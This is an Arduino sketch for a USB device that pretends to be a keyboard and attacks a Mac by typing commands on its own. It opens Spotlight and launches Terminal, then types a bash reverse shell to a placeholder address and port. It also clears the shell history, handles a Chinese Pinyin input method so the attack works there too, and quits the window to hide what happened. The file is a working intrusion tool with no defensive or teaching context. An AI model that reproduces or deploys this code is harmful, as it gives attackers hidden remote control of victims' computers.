#include<Keyboard.h>
void setup() {
  // open terminal
  Keyboard.begin();
  delay(3000);
  Keyboard.press(KEY_LEFT_GUI); //win key
  delay(200);
  Keyboard.press(' ');
  delay(200);
  Keyboard.release(KEY_LEFT_GUI);
  Keyboard.release(' ');
  delay(200);
  Keyboard.press(KEY_CAPS_LOCK);
  Keyboard.release(KEY_CAPS_LOCK);
  delay(200);
  Keyboard.print("TERMINAL.APP");
  delay(300);
  Keyboard.println();
  Keyboard.println();
  delay(200);
  Keyboard.press(KEY_CAPS_LOCK);
  Keyboard.release(KEY_CAPS_LOCK);

  // exec reverse shell
  Keyboard.println(" screen");
  Keyboard.println("");
  Keyboard.println(" bash");
  Keyboard.println("");
  delay(200);
  Keyboard.println(" bash -i>& /dev/tcp/{ip}/{port} 0>&1;history -r");
  // for Chinese, handle PinYin input method
  Keyboard.press(KEY_LEFT_CTRL);
  delay(200);
  Keyboard.press(' ');
  delay(200);
  Keyboard.release(KEY_LEFT_CTRL);
  delay(200);
  Keyboard.release(' ');
  // switch input method and retry
  Keyboard.println(" bash -i>& /dev/tcp/{ip}/{port} 0>&1;history -r");
  delay(200);
  Keyboard.println();
  // hide window
  Keyboard.press(KEY_LEFT_GUI);//win key
  delay(200);
  Keyboard.press('q');
  Keyboard.release(KEY_LEFT_GUI);
  Keyboard.release('q');
  Keyboard.println("");
  

  Keyboard.end();
}
void loop()
{
}
